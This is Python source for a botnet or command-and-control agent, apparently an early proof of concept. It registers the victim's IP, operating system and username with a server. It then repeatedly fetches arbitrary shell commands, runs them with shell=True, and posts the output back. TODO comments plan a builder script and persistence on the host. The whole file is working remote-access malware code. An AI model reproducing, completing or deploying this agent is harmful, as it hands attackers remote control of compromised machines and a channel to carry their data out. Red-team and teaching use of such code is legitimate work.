import requests 
import time
import socket
import json 
import platform
import subprocess
import random
import getpass 

"""
TODO: Create a builder script which creates this agent script 
with specific configurations.

TODO2: Create error checking for checking in with the server 
TODO3: Create persistence on the script itself. 
"""
# Need to have hardcoded server ip address 

# This is hardcoded, for now 
URL = 'http://localhost:5000'
FIRSTCONTACTKEY = 'firstcontactkey'


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()

        return IP 

def heartbeat():
    url = URL + '/firstcontact'

    data = {'firstcontactkey': FIRSTCONTACTKEY}


    res = requests.post(url, data=data)

    global REGISTERKEY
    json_data = json.loads(res.text)
    REGISTERKEY = json_data['registerkey']
    #print(REGISTERKEY)

def register(ip, os, user):
    url = URL + '/register'

    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}

    res = requests.post(url,data=data)

    #return REGISTERKEY

def fetchexec(ip):
    url = URL + '/bot/' + ip + '/task'
    data = {'registerkey': REGISTERKEY}

    try:
        res = requests.post(url, data=data)
        json_data = json.loads(res.text)
    
    # Unable to connect to the server 
    except Exception as e:
        return '[-] ' + str(e)

    #print("[*] json_data = ", json_data)

    # Command has not been staged. Return [-] and just sleep. 
    if 'command' not in json_data:
        return '[-] ' + str(json_data)

    else:
        command = json_data['command']
        print("[+] Command received: ", command)
        try:
            result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
        except Exception as e: 
            payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
            return "Status: FAILED " + payload 
        
        return result.decode('utf-8') 


def submit_result(ip, result):
    url = URL + '/bot/' + ip + '/result'
    
    data = {'registerkey': REGISTERKEY, 'result': result}

    requests.post(url, data=data)


def main():

    user = getpass.getuser()
    print(user)

    if "Linux" in platform.platform():
        host_os = 'Nix'
    elif "Windows" in platform.platform():
        host_os = 'Windows'
    else:
        print("[-] Unidentifiable OS type")

    ip = get_ip()
    #heartbeat()
    #register(ip,host_os,user)
    
    while(1): 
        heartbeat()
        register(ip, host_os, user)

        result = fetchexec(ip)

        # If server response that the bot doesn't have anything, just sleep.
        if isinstance(result, str) and '[-]' in result:
            print("[-] Sleeping...")
            time.sleep(10)
            continue

        print("[DEBUG] Result:", result)
        submit_result(ip, result)

        print("[+] Command feteched and executed. Sleeping ... ")
        
        # This is for production. For PoC, just sleep for 10 seconds.
        #timerandom = random.randint(10,20)
        
        time.sleep(10)


if __name__ == '__main__':
    main()